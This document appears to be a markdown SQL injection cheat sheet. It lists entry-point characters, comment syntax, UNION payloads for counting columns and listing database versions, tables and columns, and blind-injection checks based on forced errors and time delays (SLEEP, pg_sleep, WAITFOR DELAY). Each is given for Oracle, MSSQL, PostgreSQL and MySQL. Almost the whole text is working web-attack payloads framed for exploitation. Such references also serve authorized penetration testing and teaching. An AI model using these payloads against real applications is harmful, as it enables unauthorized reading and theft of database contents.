# Check for SQLi
## Determine entry point
**All SQL types:**
```
'
"
`
')
")
`)
'))
"))
`))
```
## Comments after query injection
**Oracle:**
```sql
--comment
```
**PostgreSQL, MSQL, MySQL, SQLite:**
```sql
-- comment [note the space after the double hyphen]
/*comment*/
```

# Union Based SQL Injection
If you can see the output of your SQL query then this is the best way to exploit it ``╰(*°▽°*)╯``

## Get number of columns
**MySQL, MSQL, PostgreSQL:**
```sql
'' UNION SELECT null, null, null... -- 
```
**Oracle:**
```sql
'' UNION SELECT null, null... FROM dual -- 
```
## Get database versions
**Oracle:**
```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```
**MySQL, MSQL:**
```sql
SELECT @@version
```
**PostgreSQL:**
```sql
SELECT version()
```
## Get all tables
**Oracle:**
```sql
SELECT * FROM all_tables
```
**MSQL, PostgreSQL, MySQL:**
```sql
SELECT * FROM information_schema.tables
```
## Get all columns
**Oracle:**
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```
**MSQL, PostgreSQL, MySQL:**
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
## Concatenate strings
**Oracle, PostgreSQL:**
```sql
'foo'||'bar'
```
**MSQL:**
```sql
'foo'+'bar'
```
**MySQL:**
```sql
'foo' 'bar' -- Note the space between the two strings
CONCAT('foo','bar')
```

# Blind SQLi
If you cant see the output of your query then try these ``（￣︶￣）↗``　

*These are not copy-pastable , you'll need to modify them to fit your already-working injection*

## Check your query can trigger an error response from the application
**Oracle:**
```sql
SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```
**MSQL:**
```sql
SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END
```
**PostgreSQL:**
```sql
1 = (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
```
**MySQL:**
```sql
SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
```

## Check your query can cause a time delay in the application
**Oracle:**
```sql
SELECT CASE WHEN (1=2) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```
**MSQL:**
```sql
IF (1=1) WAITFOR DELAY '0:0:10' 
```
**PostgreSQL:**
```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
```
**MySQL:**
```sql
SELECT IF(1=1,SLEEP(10),'a')
```

